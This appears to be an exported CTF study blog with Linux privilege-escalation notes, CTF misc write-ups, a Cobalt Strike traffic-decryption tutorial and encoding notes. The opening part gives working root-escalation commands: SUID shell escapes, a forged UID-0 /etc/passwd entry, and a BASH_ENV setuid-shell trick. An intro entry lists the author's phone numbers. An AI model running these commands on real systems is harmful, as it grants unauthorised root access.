&#x2F;usr&#x2F;bin&#x2F;ksh
ksh -p


&#x2F;usr&#x2F;bin&#x2F;zsh
zsh


&#x2F;usr&#x2F;bin&#x2F;find
find &#x2F;etc&#x2F;passwd -exec &#x2F;bin&#x2F;bash -p ;


&#x2F;usr&#x2F;bin&#x2F;awk
awk ‘BEGIN {system(“&#x2F;bin&#x2F;bash”)}’


&#x2F;usr&#x2F;bin&#x2F;man
!&#x2F;bin&#x2F;bash


&#x2F;usr&#x2F;bin&#x2F;more
!&#x2F;bin&#x2F;bash


利用相关命令均可在这个网站上查询：GTFOBins
namp适用版本：nmap2.02至5.21。
nmap是一个经典的端口扫描工具，当目标主机存在版本在2.02-5.21之间的nmap且os的版本在上面受影响的范围内或更早就可以尝试使用这种方法进行提权。
首先是进入nmap交互模式
nmap --interactive

之后利用命令进行提权
nmap&gt; !shsh-3.2# whoamiroot



less&#x2F;more使用more和less一定读取一个比较大的文件，如果文件太小无法进入翻页功能，无法使用!命令进入shell。
less与more相似，以less为例
less是一种查看文件的命令，但是我们也可以利用less进行执行我们的shell命令
less /etc/passwd

之后进入交互界面，输入
!/bin/sh

VISUAL=&quot;/bin/sh -c &#x27;/bin/sh&#x27;&quot; less /etc/profilevless /etc/profilev:shell

就可以进入交互界面然后写入shell的
nanonano进入shell页面似乎比较简单
nanoctrl + Rctrl + X#shell



cp&#x2F;mv以cp为例
主要是利用cp命令覆盖&#x2F;etc&#x2F;passwd从而进行提权
whoami#qszd

openssl passwd -1 -salt test testaaa

echo &#x27;test:$1$test$giCVmzusADSPMon2mwEWo1:0:0::/root/:/bin/sh&#x27; &gt;&gt; passwd

cat /etc/passwd

su - test



vi&#x2F;vimvim为例
首先是一种比较特殊的情况，就是vim被配置了suid权限，所以只有root才能有权限进行读写，这种时候就是
vim.tiny /etc/passwd

:!/bin/sh



BASH_ENV提权
前提知识: 在Linux中，.bashrc 被用来初始化交互shell，而 BASH_ENV 用来初始化非交互shell; 
就是说只要是在 BASH_ENV 变量中写入的语句，在每个shell脚本执行前，都会执行一次。

由此可见，使用BASH_ENV提权,只要按照以下3个步骤即可:

得到一个linux管理员使用su命令的账户;
定义BASH_ENV变量;
等待linux管理员使用su切换到root，执行某个脚本;

第三步也可以运行那种暂时提高到root的程序脚本
写入环境变量
echo &#x27;cp /bin/bash /tmp/root_shell; chmod +xs /tmp/root_shell&#x27; &gt; /tmp/exploit export BASH_ENV=/tmp/exploit  #写入exploit到环境变量中

接下来执行程序就可以拿到shell了
/tmp/root_shell -p  # 获取 root shell

或者直接在root里面找flag
export BASH_ENV=/tmp/test.sh  echo &#x27;cat /root/flag &gt; /tmp/root.txt 2&gt;&amp;1&#x27; &gt; /tmp/test.sh  #写入执行程序cat /tmp/root.txt  #读取



其他提权通过查询历史记录从而获得信息泄露的信息利用以下命令可以获取
cat ~/.bash_history

这个命令可以查看当前用户使用过的历史命令
有可能会得到root登录的密码
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>2024冬季春秋杯部分wp</title>
    <url>/2025/01/2024%E5%86%AC%E5%AD%A3%E6%98%A5%E7%A7%8B%E6%9D%AF%E9%83%A8%E5%88%86wp/</url>
    <content><![CDATA[全部解析可以在春秋伽玛的公众号上看到
这里仅是本人写的部分wp
1.See anything in these pics?拿到一个zip和二维码
二维码拖进这个网站扫一下 QR Code Decoder | QR Code Scanner
得到5FIVE，解压zip，拿到一张图片
因为提示我们不止一张图片，于是我们foremost一下
又得到一个图片
图片拖进随波逐流直接出了,原来是宽高改了




2.简单算术拿到ysxdg&#x2F;m@]mjkz@vl@zlf&gt;b
提示我们想想异或
拖进随波逐流，暴力解密xor，keylength选2以上的，然后筛选有flag的，直接出了




3.简单镜像提取还是比较简单的
拿到一个压缩包然后得到一个流量
我话不多说直接foremost得到一个img，点不开
然后我又foremost这个img就能拿到一个zip和一个xls
点开这个xls就能看到flag了




4.压力大，写个脚本吧点开这个压缩包就明白了，意思是有100个zip，password是旁边这个txt经过base64解码后的，需要我们写脚本爆破他。
脚本
import osimport zipfileimport base64def extract_nested_zips_with_base64_password(initial_zip_path):    &quot;&quot;&quot;    解压嵌套压缩包，密码存储在对应的 `password_xx.txt` 文件中，并经过 Base64 解码。    文件解压到当前目录。    参数：    - initial_zip_path (str): 初始压缩包的路径。    &quot;&quot;&quot;    current_zip_path = initial_zip_path    while True:        # 获取当前压缩包的编号        base_name = os.path.splitext(os.path.basename(current_zip_path))[0]        zip_number = base_name.split(&#x27;_&#x27;)[-1]  # 提取编号部分        password_file = f&quot;password_&#123;zip_number&#125;.txt&quot;  # 对应的密码文件名        # 检查密码文件是否存在        if not os.path.exists(password_file):            print(f&quot;未找到密码文件: &#123;password_file&#125;，无法继续解压 &#123;current_zip_path&#125;&quot;)            break        # 读取密码并进行 Base64 解码        try:            with open(password_file, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as pf:                encoded_password = pf.read().strip()                password = base64.b64decode(encoded_password).decode(&#x27;utf-8&#x27;)  # 解码 Base64 密码        except Exception as e:            print(f&quot;处理密码文件 &#123;password_file&#125; 时出错: &#123;e&#125;&quot;)            break        # 解压当前压缩包        try:            with zipfile.ZipFile(current_zip_path, &#x27;r&#x27;) as zip_ref:                files = zip_ref.namelist()                if not files:                    print(f&quot;&#123;current_zip_path&#125; 是空压缩包。&quot;)                    break                # 筛选出下一个压缩包，忽略非 `.zip` 文件（如密码文件）                next_zip_path = None                for file_name in files:                    zip_ref.extract(file_name, os.getcwd(), pwd=bytes(password, &#x27;utf-8&#x27;))                    print(f&quot;&#123;password&#125;&quot;)                    # 如果是 `.zip` 文件，记录路径以便继续解压                    if file_name.endswith(&#x27;.zip&#x27;):                        next_zip_path = os.path.join(os.getcwd(), file_name)        except RuntimeError as e:            print(f&quot;解压 &#123;current_zip_path&#125; 时密码错误或其他问题: &#123;e&#125;&quot;)            break        except zipfile.BadZipFile as e:            print(f&quot;&#123;current_zip_path&#125; 不是有效的压缩包: &#123;e&#125;&quot;)            break        # 如果没有下一个 `.zip` 文件，说明解压结束        if not next_zip_path:            print(f&quot;解压完成。最终文件存储在当前目录&quot;)            break        current_zip_path = next_zip_path  # 更新路径，继续解压下一个 `.zip` 文件# 参数设置initial_zip_path = &#x27;zip_99.zip&#x27;  # 初始压缩包名称# 执行函数extract_nested_zips_with_base64_password(initial_zip_path)

然后把得到一个flag-hint.txt是PASSWORD+PASSWORD.png
我们需要把所有密码连起来，去重，然后010得到一个png
就能得到flag了
5.音频的秘密得到的音频提示是deepsound
我们使用deepsound2.2，发现需要密码（注意这里不能用deepsound2.0）
密码提示是弱密码，经尝试是123
然后得到一个flag.zip
由于是store压缩方式，所以尝试明文攻击


然后得到了flag.png，lsb提取一下即可




6.Infinity题目给了一个png，可以foremost一下得到一个压缩包，点开发现还是一个压缩包，再点开还是一个压缩包，可以看出来是多层压缩包要写个脚本循环解压。
脚本
import osimport zipfileimport tarfileimport py7zr# 记录每层压缩包名字的列表compressed_files = []def extract_archive(archive_path):    global compressed_files    # 用于存储待解压的文件队列    to_extract = [archive_path]    # 用于记录已经解压过的文件    extracted = set()    while to_extract:        file_path = to_extract.pop(0)        if file_path in extracted:            continue        # 记录当前压缩包的名字        compressed_files.append(file_path)        extracted.add(file_path)        file_extension = os.path.splitext(file_path)[1].lower()        if file_extension == &#x27;.zip&#x27;:            # 解压zip文件            try:                with zipfile.ZipFile(file_path, &#x27;r&#x27;) as zip_ref:                    zip_ref.extractall(os.path.dirname(file_path))            except zipfile.BadZipFile:                print(f&quot;文件 &#123;file_path&#125; 不是有效的 ZIP 文件或已损坏。&quot;)        elif file_extension == &#x27;.7z&#x27;:            # 解压7z文件            try:                with py7zr.SevenZipFile(file_path, mode=&#x27;r&#x27;) as z:                    z.extractall(os.path.dirname(file_path))            except py7zr.Bad7zFile:                print(f&quot;文件 &#123;file_path&#125; 不是有效的 7z 文件或已损坏。&quot;)        elif file_extension in [&#x27;.tar&#x27;, &#x27;.tar.gz&#x27;, &#x27;.tar.bz2&#x27;]:            # 解压tar文件            try:                with tarfile.open(file_path, &#x27;r&#x27;) as tar_ref:                    tar_ref.extractall(os.path.dirname(file_path), filter=&#x27;data&#x27;)            except tarfile.ReadError:                print(f&quot;文件 &#123;file_path&#125; 不是有效的 tar 文件或已损坏。&quot;)        else:            print(f&quot;不支持的文件格式: &#123;file_path&#125;&quot;)            continue        # 查找新生成的压缩包并添加到待解压队列        for root, dirs, files in os.walk(os.path.dirname(file_path)):            for file in files:                new_file_path = os.path.join(root, file)                new_extension = os.path.splitext(new_file_path)[1].lower()                if new_extension in [&#x27;.zip&#x27;, &#x27;.7z&#x27;, &#x27;.tar&#x27;, &#x27;.tar.gz&#x27;, &#x27;.tar.bz2&#x27;]:                    to_extract.append(new_file_path)if __name__ == &quot;__main__&quot;:    # 输入要解压的压缩包路径    archive_path = input(&quot;请输入压缩包的路径: &quot;)    if os.path.exists(archive_path):        extract_archive(archive_path)        print(&quot;每层压缩包的名字:&quot;)        for file in compressed_files:            print(file)    else:        print(&quot;输入的路径不存在，请检查后重新输入。&quot;)

最后解压出来一个SeCr3t.txt
内容是 Inf1nityIsS0CoOL
然后将得到的文件名字由内而外（即倒过来）连起来，这里可以用cyberchef的reverse
由于题目提示：BASE58-Ripple、SM4-ECB


这里SM4的key就是之前的内容
将保存下来的内容010一下得到png，就能得到这样一个png


然后二维码扫一下就可以了，网站： QR Code Decoder | QR Code Scanner


出了
]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>Before-everthing</title>
    <url>/2024/11/Before-everthing/</url>
    <content><![CDATA[这里是MetaVi的Blog主要更新一些学习上的问题，简单的笔记和写题的记录…尽量使自己学有所得–
——————————
作者VX:x3289444724作者QQ:3289444724联系电话:①13968975069②18072320271]]></content>
  </entry>
  <entry>
    <title>Network Traffic Analysis</title>
    <url>/2025/02/Network-Traffic-Analysis/</url>
    <content><![CDATA[写在前面感觉流量分析真的是MISC中的一个大项，开一篇专门的文章好学习流量分析
CS流量——CobaltStrike流量
“Cobalt Strike 是一款GUI的框架式渗透工具，集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe木马生成，win dll木马生成，java木马生成，office宏病毒生成，木马捆绑；钓鱼攻击包括：站点克隆，目标信息获取，java执行，浏览器自动攻击等等。”
一些细节知识可以看这个 Cobalt Strike | Defining Cobalt Strike Components &amp; BEACON | Google Cloud Blog
更多CS流量相关看 前言 | Cobalt Strike

Cobalt Strike 服务端和客户端是通过 SSL 加密通讯的 (默认证书对 cobaltstrike.store )。
Beacon 的元数据传输过程中虽然使用的是 RSA 算法，但是 Beacon 任务的传输使用的却是 AES 算法加密的，而 AES 密钥则是 Beacon 随机生成的然后通过 RSA 交换 AES密钥。加解密算法为 AES ，密钥位长 128 ，CBC 模式，填充标准 PKCS7 ，其通信具体流程如下。


流量传递Cobalt Strike 分为 客户端 与 服务端 ，服务端是一个，客户端可以有多个，可被团队进行分布式协作操作。
Cobalt Strike 的 Beacon 支持异步通信和交互式通信。Beacon 可以选择通过 DNS 还是 HTTP 协议出口网络，你甚至可以在使用Beacon 通讯过程中切换 HTTP 和 DNS。其支持多主机连接，部署好 Beacon 后提交一个要连回的域名或主机的列表，Beacon 将通过这些主机轮询。
http-beacon 通信中，默认使用 GET 方法向 /dpixel 、/__utm.gif 、/pixel.gif 等地址发起请求，同时 Cobalt Strike 的Beacon 会将元数据（例如AES密钥）使用 RSA 公钥加密后发送给 C2 服务器。
这些元数据通常被编码为 Base64 字符串并作为 Cookie 发送。如下图：
流量特征cs流量的http通讯一般会有以下的特征
比如搜索http类型数据后查看到有出现post请求/sumbit.php？id=xxx的特征，该特征可以判断 cobalt strike。
这是因为cs在下发特征时会请求这个/sumbit.php？id=xxx，同时 POST 传递了一串 0000 开头的16进制数据，这是 cs 流量的发送任务数据（可以根据这个辨别cs），任务数据里的内容十分重要，如下：




心跳包特征：
间隔一定时间，均有通信，且流级上的上下行数据长度固定；
使用Wireshark等网络抓包工具，可以捕获到后门的HTTP数据包“GET &#x2F;4Ekx HTTP&#x2F;1.1”，其中的 “4Ekx”就是心跳包，通过查看心跳包获取一般cs心跳包会有4个数字或者字母组成。
https特征：
https-beacon 通信中，默认使用空证书建立加密通道，流量中可以看见这一过程。
在数据包的client hello中，数据包有JA3（JA3 是由 John Althouse、Jeff Atkinson 和 Josh Atkins 创建的开源项目。 JA3 &#x2F; JA3S 可以为客户端和服务器之间的通信创建 SSL 指纹。）
和操作系统有关，每个操作系统都有固定的值。这里列出几个已知的 ja3 &#x2F; ja3s 指纹信息，这个值在不同操作系统上是不一样的
JA3

72a589da586844d7f0818ce684948eea
a0e9f5d64349fb13191bc781f81f42e1

JA3s

b742b407517bac9536a77a7b0fee28e9
ae4edc6faf64d08308082ad26be60767

解密那拿到的cs流量我们怎么解密呢？
大致是需要三样东西： .cobaltstrike.beacon_keys 文件、cookie元数据、submit.php的data
第一种方法：
这种一步到位
有了这三样东西我们便可以直接执行脚本，项目地址 5ime&#x2F;CS_Decrypt: CobaltStrike流量解密脚本
安装库：
pip install hexdump javaobj-py3

脚本如下：
import hmacimport base64import hashlibimport hexdumpimport binasciiimport javaobj.v2 as javaobjfrom Crypto.Cipher import AESfrom Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_v1_5file_path = &quot;.cobaltstrike.beacon_keys&quot;#.cobaltstrike.beacon_keys文件路径encode_data = &quot;U8jm3+oqzYLuUiRd9F3s7xVz7fGnHQYIKF9ch6GRseWfcBSSk+aGhWP3ZUyHIkwRo1/oDCcKV7LYAp022rCm9bC7niOgMlsvgLRolMKIz+Eq5hCyQ0QVScH8jDYsJsCyVw1iaTf5a7gHixIDrSbTp/GiPQIwcTNZBXIJrll540s=&quot;#元数据内容encrypt_data = &quot;000000c093dff6b2f058ba4231e3900276566441f2bb4c76e5c8480874a4d99df083054a5ea1dd4aea5523c751af7d123ee8e9f2253a5ccdcf54427d147c556b15657ee2607e92b35732f26341bc0a26c58bf2bcf2383ad640641c364159387223360cc16ff3dc14ab1f00e6ee4fb53f5e15b767bd379451d0d7b6f4aeae9db0c3f30f3ef167b7db3e6ac241643ed2513e73f9e9148ebe7afaa122ea75e945c8ab8a816179e43180257bd8be752827dd0de26826d5611ee09391ee5545897dae1d3a9698&quot;#任务数据内容def format_key(key_data):    key_data = bytes(map(lambda x: x &amp; 0xFF, key_data))    formatted_key = f&quot;-----BEGIN PRIVATE KEY-----\n&quot;    formatted_key += base64.encodebytes(key_data).decode()    formatted_key += f&quot;-----END PRIVATE KEY-----&quot;    return formatted_keydef decrypt(encrypted_data, iv_bytes, signature, shared_key, hmac_key):    if hmac.new(hmac_key, encrypted_data, digestmod=&quot;sha256&quot;).digest()[:16] != signature:        print(&quot;message authentication failed&quot;)        return    cipher = AES.new(shared_key, AES.MODE_CBC, iv_bytes)    return cipher.decrypt(encrypted_data)with open(file_path, &quot;rb&quot;) as fd:    pobj = javaobj.load(fd)PRIVATE_KEY = format_key(pobj.array.value.privateKey.encoded.data)private_key = RSA.import_key(PRIVATE_KEY.encode())cipher = PKCS1_v1_5.new(private_key)ciphertext = cipher.decrypt(base64.b64decode(encode_data), 0)if ciphertext[0:4] == b&#x27;\x00\x00\xBE\xEF&#x27;:    raw_aes_keys = ciphertext[8:24]    raw_aes_hash256 = hashlib.sha256(raw_aes_keys).digest()    aes_key = raw_aes_hash256[0:16]    hmac_key = raw_aes_hash256[16:]SHARED_KEY = binascii.unhexlify(aes_key.hex())HMAC_KEY = binascii.unhexlify(hmac_key.hex())encrypt_data = base64.b64encode(bytes.fromhex(encrypt_data)).decode()encrypt_data = base64.b64decode(encrypt_data)encrypt_data_length = int.from_bytes(encrypt_data[:4], byteorder=&#x27;big&#x27;, signed=False)encrypt_data_l = encrypt_data[4:]data1 = encrypt_data_l[:encrypt_data_length-16]signature = encrypt_data_l[encrypt_data_length-16:encrypt_data_length]iv_bytes = b&quot;abcdefghijklmnop&quot;dec = decrypt(data1, iv_bytes, signature, SHARED_KEY, HMAC_KEY)print(&quot;AES key: &#123;&#125;&quot;.format(aes_key.hex()))print(&quot;HMAC key: &#123;&#125;&quot;.format(hmac_key.hex()))print(dec[12:int.from_bytes(dec[4:8], byteorder=&#x27;big&#x27;, signed=False)])print(hexdump.hexdump(dec))

需要修改的就只有三个：file_path、encode_data、encrypt_data
同时因为心跳包（submit.php的data）不止一个，需要我们修改脚本里的encrypt_data多次尝试。
。
。
。
第二种方法：
这种是一步步来的，分了大概四步
因为是CTF比赛所以会有.cobaltstrike.beacon_keys 文件，同时该文件本质上为 KeyPair 的 Java 对象，Python 的 javaobj-py3 库可以直接读取里面存储的数据。
首先，我们需要先获取 .cobaltstrike.beacon_keys 文件中的私钥。这个私钥是 RSA 私钥，用于解密元数据。
脚本：
import base64import javaobj.v2 as javaobjwith open(&quot;.cobaltstrike.beacon_keys&quot;, &quot;rb&quot;) as fd:    pobj = javaobj.load(fd)def format_key(key_data, key_type):    key_data = bytes(map(lambda x: x &amp; 0xFF, key_data))    formatted_key = f&quot;-----BEGIN &#123;key_type&#125; KEY-----\n&quot;    formatted_key += base64.encodebytes(key_data).decode()    formatted_key += f&quot;-----END &#123;key_type&#125; KEY-----&quot;    return formatted_keyprivateKey = format_key(pobj.array.value.privateKey.encoded.data, &quot;PRIVATE&quot;)publicKey = format_key(pobj.array.value.publicKey.encoded.data, &quot;PUBLIC&quot;)print(privateKey)print(publicKey)

然后我们在通过私钥解密元数据、获取 AES KEY，其中 encode_data 为元数据，也就是之前看到的 cookie 的值。
那什么是AESkey呢？
因为Cobalt Strike 的 Beacon 通信主要依赖于 AES key 和 HMAC key 。这两个密钥都是由 Beacon 在每次执行时随机生成的 16字节数据。
AES key：这个密钥用于加密和解密 Beacon 与 C2 服务器之间的通信内容。具体来说，它用于 AES 算法，该算法用于加密和解密Beacon任务的传输。
HMAC key ：这个密钥用于验证数据的完整性和真实性。HMAC （Hash-based Message Authentication Code）是一种基于密钥的哈希算法，用于在不安全的通信环境中验证消息的完整性和真实性。
这两个密钥都是由同一组16字节数据生成的。具体来说，这组16字节数据的 SHA256 哈希的前半部分作为 HMAC 密钥，后半部分作为 AES 密钥。
脚本：
import hashlibfrom Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_v1_5import base64import hexdumpPRIVATE_KEY = &quot;&quot;&quot;-----BEGIN PRIVATE KEY-----&#123;MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAIzAss/1Vcd49UN5XT+pVELCnX1rTo4LhSzcP7sPOrIOQg0onSpKO1tzOVX+2DqtZsSFoFrAmrEV+gZCbFfhYR9vs5DGLUg9aa0i5GqhPz/s4v5wcmgUgfnvjh4oK7yPQ5BMcqESCjEim9MXs70by1U7ZN+wOYZEorInV9gPkCJdAgMBAAECgYAJbRpMjQyamEIsq6MQEWIAOpJbhOU05BaeI33tJB71L7lCslacL258OGI9nRyUCWrZfG15xm5Vr7gX1Tj2RbTAUZmGigY1X2rCyz00DFjj5iIQVWsl8eSI1EmjFmQ+rYnCezQcrt4V3c7BZtW9RjFWvHh09PF808Yl4/+++vrMoQJBAKhCa/adRGEFqiVcSZG2FdlUG4bPMfwRkYMERZG5D6fjVHOVNEyL3MK+EtafnYIDD1IS+97K0cbg922RKXNdv+kCQQDWJk0kNe8ePBpwJU4slig1Y+4VWuwTRz6r+MNpv+WrVMzo/LHzAKYn87pyAdxLaZyKAFKs86WpJ2n93ZslC9pVAkA0KMMHJCF6YiMoib9UqDmFsYkG9VvtZBTTpJNcZR3xUYtweSRJRmIdDIcSeVB+aSxqqO/jVMRK/po1IPbUiI9hAkEAi93wPFpNlv3CdsSmzlA0asqd0azUy7KYqFGNsB/5rXFxdCq3PvOJkkaJ27SDYW3VI/0aAoQQCu8HNxvqHMQlEQJBAIFIkfpeSfksLu8NgiFvZsTV8EWF9PfF2VLyqeSGtmySujqb0HbxGnM9SDc0k48wOvIn5YGJPyY2ddsyNI6XbCU=&#125;-----END PRIVATE KEY-----&quot;&quot;&quot;#rsa私钥encode_data = &quot;U8jm3+oqzYLuUiRd9F3s7xVz7fGnHQYIKF9ch6GRseWfcBSSk+aGhWP3ZUyHIkwRo1/oDCcKV7LYAp022rCm9bC7niOgMlsvgLRolMKIz+Eq5hCyQ0QVScH8jDYsJsCyVw1iaTf5a7gHixIDrSbTp/GiPQIwcTNZBXIJrll540s=&quot;#元数据private_key = RSA.import_key(PRIVATE_KEY.encode())cipher = PKCS1_v1_5.new(private_key)ciphertext = cipher.decrypt(base64.b64decode(encode_data), 0)if ciphertext[0:4] == b&#x27;\x00\x00\xBE\xEF&#x27;:    raw_aes_keys = ciphertext[8:24]    raw_aes_hash256 = hashlib.sha256(raw_aes_keys).digest()    aes_key = raw_aes_hash256[0:16]    hmac_key = raw_aes_hash256[16:]    print(&quot;AES key: &#123;&#125;&quot;.format(aes_key.hex()))    print(&quot;HMAC key: &#123;&#125;&quot;.format(hmac_key.hex()))    hexdump.hexdump(ciphertext)

到此我们就得到了 AES key 和 HMAC key
接着要去解密 submit.php 所传递的 Data ，首先我们要先对该串16进制数据进行处理，转字符串后进行 Base64 编码
import base64encode_data = &#x27;000000c093dff6b2f058ba4231e3900276566441f2bb4c76e5c8480874a4d99df083054a5ea1dd4aea5523c751af7d123ee8e9f2253a5ccdcf54427d147c556b15657ee2607e92b35732f26341bc0a26c58bf2bcf2383ad640641c364159387223360cc16ff3dc14ab1f00e6ee4fb53f5e15b767bd379451d0d7b6f4aeae9db0c3f30f3ef167b7db3e6ac241643ed2513e73f9e9148ebe7afaa122ea75e945c8ab8a816179e43180257bd8be752827dd0de26826d5611ee09391ee5545897dae1d3a9698&#x27;#任务数据bytes_data = bytes.fromhex(encode_data)encrypt_data = base64.b64encode(bytes_data)print(encrypt_data.decode())

最终分别填入 SHARED_KEY，HMAC_KEY，encrypt_data 即可
import hmacimport binasciiimport base64import hexdumpfrom Crypto.Cipher import AESSHARED_KEY = binascii.unhexlify(&quot;ef08974c0b06bd5127e04ceffe12597b&quot;)#AES keyHMAC_KEY = binascii.unhexlify(&quot;bd87fa356596a38ac3e3bb0b6c3496e9&quot;)#HMAC keyencrypt_data = &quot;AAAAwJPf9rLwWLpCMeOQAnZWZEHyu0x25chICHSk2Z3wgwVKXqHdSupVI8dRr30SPujp8iU6XM3PVEJ9FHxVaxVlfuJgfpKzVzLyY0G8CibFi/K88jg61kBkHDZBWThyIzYMwW/z3BSrHwDm7k+1P14Vt2e9N5RR0Ne29K6unbDD8w8+8We32z5qwkFkPtJRPnP56RSOvnr6oSLqdelFyKuKgWF55DGAJXvYvnUoJ90N4mgm1WEe4JOR7lVFiX2uHTqWmA==&quot;#任务数据（解密过的）def decrypt(encrypted_data, iv_bytes, signature, shared_key, hmac_key):    if hmac.new(hmac_key, encrypted_data, digestmod=&quot;sha256&quot;).digest()[:16] != signature:        print(&quot;message authentication failed&quot;)        return    cipher = AES.new(shared_key, AES.MODE_CBC, iv_bytes)    return cipher.decrypt(encrypted_data)encrypt_data = base64.b64decode(encrypt_data)encrypt_data_length = int.from_bytes(encrypt_data[:4], byteorder=&#x27;big&#x27;, signed=False)encrypt_data_l = encrypt_data[4:]data1 = encrypt_data_l[:encrypt_data_length-16]signature = encrypt_data_l[encrypt_data_length-16:encrypt_data_length]iv_bytes = b&quot;abcdefghijklmnop&quot;dec = decrypt(data1, iv_bytes, signature, SHARED_KEY, HMAC_KEY)print(&quot;counter: &#123;&#125;&quot;.format(int.from_bytes(dec[:4], byteorder=&#x27;big&#x27;, signed=False)))print(&quot;任务返回长度: &#123;&#125;&quot;.format(int.from_bytes(dec[4:8], byteorder=&#x27;big&#x27;, signed=False)))print(&quot;任务输出类型: &#123;&#125;&quot;.format(int.from_bytes(dec[8:12], byteorder=&#x27;big&#x27;, signed=False)))print(dec[12:int.from_bytes(dec[4:8], byteorder=&#x27;big&#x27;, signed=False)])print(hexdump.hexdump(dec))

就OK了
例题： 2023 SICTF 一起上号不         解析： Misc Record | MetaVi （在#杂题那）
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Network</tag>
      </tags>
  </entry>
  <entry>
    <title>Misc Ultra</title>
    <url>/2024/11/Misc-Ultra/</url>
    <content><![CDATA[写在前面MISC的学习是极广的，很多都要学习，而记在博客上是最方便有效的方法了，可以随时翻阅
这篇博客会随着我的一点点学习而逐渐被填写，因此不会很快。。
各种文件头尾.zip的文件头：50 4B 03 04 14 00 08 00.rar的文件头：52 61 72 21.rar的文件尾：C4 3D 7B 00 40 07 00.7z的文件头：37 7A BC AF 27 1C.pyc的文件头：03 F3 0D 0A.jpg的文件头：FF D8 FF E0 00 10 4A 46 49 46 00 01.png的文件头：89 50 4e 47 0d 0a 1a 0a   文件尾：49 45 4E 44 AE 42 60 82.gif的文件头：47 49 46 38 39 61（GIF89A）或 47 49 46 38 37 61（GIF87A）.gif的文件尾：00 3B.gz的文件头：1F 8B 08 00.pyc的文件头：03 F3 0D 0A.psd的文件头：38 42 50 53TIFF (tif)，文件头：49492A00Windows [Bitmap](https://so.csdn.net/so/search?q=Bitmap&amp;spm=1001.2101.3001.7020) (bmp)，文件头：424DCAD (dwg)，文件头：41433130Adobe Photoshop (psd)，文件头：38425053Rich Text Format (rtf)，文件头：7B5C727466XML (xml)，文件头：3C3F786D6CHTML (html)，文件头：68746D6C3EEmail [thorough only] (eml)，文件头：44656C69766572792D646174653AOutlook Express (dbx)，文件头：CFAD12FEC5FD746FOutlook (pst)，文件头：2142444EMS Word/Excel (xls.or.doc)，文件头：D0CF11E0MS Access (mdb)，文件头：5374616E64617264204AWordPerfect (wpd)，文件头：FF575043Postscript (eps.or.ps)，文件头：252150532D41646F6265Adobe Acrobat (pdf)，文件头：255044462D312EQuicken (qdf)，文件头：AC9EBD8FWindows Password (pwl)，文件头：E3828596Wave (wav)，文件头：57415645AVI (avi)，文件头：41564920Real Audio (ram)，文件头：2E7261FDReal Media (rm)，文件头：2E524D46MPEG (mpg)，文件头：000001BAMPEG (mpg)，文件头：000001B3Quicktime (mov)，文件头：6D6F6F76Windows Media (asf)，文件头：3026B2758E66CF11MIDI (mid)，文件头：4D546864M4a，文件头：00000018667479704D3441

我发现mc-office的头尾也是50 4B 03 04
各种加密思路：加密的方法有很多，要看是什么加密了
base加密原理：Base 编码（Base Encoding）是一种将二进制数据转换为可打印字符的编码方式。常见的 Base 编码有 Base64、Base32 和 Base16 等，它们的工作原理相似，只是使用的字符集和编码方式不同。
1.基本原理
Base 编码的核心原理是将一串二进制数据（字节）按照一定的规则分组，并将每组数据映射为一个字符。这样可以保证编码后的数据由可打印的字符组成，通常用于在文本格式中传输二进制数据。
以 Base64 为例，下面是其编码原理：

输入数据分组：将输入的二进制数据每 3 个字节一组，每个字节 8 位，总共 24 位。
划分为 4 组：将这 24 位数据分成 4 组，每组 6 位。例如，输入数据为 3 字节（24 位），经过分组后就变成 4 个 6 位的数据块。
字符映射：将每个 6 位的数据块映射到一个字符表。Base64 的字符表包括大小写字母（A-Z、a-z）、数字（0-9）和两个符号（+ 和 &#x2F;）。总共有 64 个字符，所以叫 Base64。
输出结果：输出的是一个由这 64 个字符组成的字符串。如果原始数据的字节数不是 3 的倍数，Base64 编码会使用一个或两个 = 来填充，使得输出的字符数是 4 的倍数。

2.举个例子
以字符串 &quot;Hello&quot; 为例：

将 &quot;Hello&quot; 转换为 ASCII 码：H e l l o → 72 101 108 108 111

转换为二进制：
01001000 01100101 01101100 01101100 01101111

按 3 字节（24 位）分组（不足补 0）：
01001000 01100101 01101100 01101100 01101111 00000000

拆分为 6 位：
010010 000110 010101 101100 011011 000110 111101 000000

查 Base64 表：
S  G  V  s  b  G  8  =

最终 Base64 编码结果为：
SGVsbG8=

3.其他常见的 Base 编码

Base32：将每 5 个字节转为 8 个字符，使用 32 个字符（A-Z、2-7）。它的特点是比 Base64 更加健壮，对字母区分大小写的要求较低，通常用于限制字符集时（如避免使用特殊字符）。
Base16（Hex）：将每个字节编码为两个十六进制字符，常用于表示十六进制数据。

4.总结
Base 编码的核心思想是将二进制数据映射为可打印字符，使得原本只能通过二进制传输的数据能够通过文本协议进行传输。不同的 Base 编码有不同的字符集，常见的有 Base64、Base32 和 Base16。
工具：解密的时候要注意是不是换表的base
cyberchef一个解密的网站
随波逐流随波逐流支持换表base，多行base
其中有个base64隐写解密甚至可以把解密出来的脚本运行了
puzzlesolver这个可以补全base32，64隐写
basecrack先要装好工具
因为我给basecrack单独装了一个虚拟环境，所以运行时候要激活它
切换到目录
cd basecrack

激活虚拟环境
source venv/bin/activate

运行
python basecrack.py



就可以开始解密了。
如果想让他一直解密的话用
python basecrack.py -m

脚本如果确信是base加密而以上方式都没有解密出来的话可以试试这个脚本
import base64import reimport base91def baseDec(text,type):    if type == 1:        return base64.b16decode(text)    elif type == 2:        return base64.b32decode(text)    elif type == 3:        return base64.b64decode(text)    elif type == 4:        return base64.b85decode(text)    elif type == 5:        return base91.decode(text.decode())    else:        passdef detect(text):    try:        if re.match(&quot;^[0-9A-F=]+$&quot;,text.decode()) is not None:            return 1    except:        pass    try:        if re.match(&quot;^[A-Z2-7=]+$&quot;,text.decode()) is not None:            return 2    except:        pass    try:        if re.match(&quot;^[A-Za-z0-9+/=]+$&quot;,text.decode()) is not None:            return 3    except:        pass    try:        if re.match(&quot;^[A-Za-z0-9$%()*+,-./:;?@[\]^_`&#123;|&#125;~]+$&quot;,text.decode()) is not None:            return 4    except:        pass    try:        if 